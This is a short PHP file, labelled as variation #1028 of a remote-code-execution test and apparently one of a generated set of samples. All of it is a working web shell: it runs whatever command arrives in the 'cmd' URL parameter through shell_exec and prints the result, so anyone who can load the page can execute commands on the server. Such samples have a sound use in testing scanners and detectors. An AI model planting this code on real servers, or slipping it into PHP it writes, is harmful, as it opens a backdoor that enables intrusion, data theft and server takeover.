<?php
// RCE test variation #1028
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>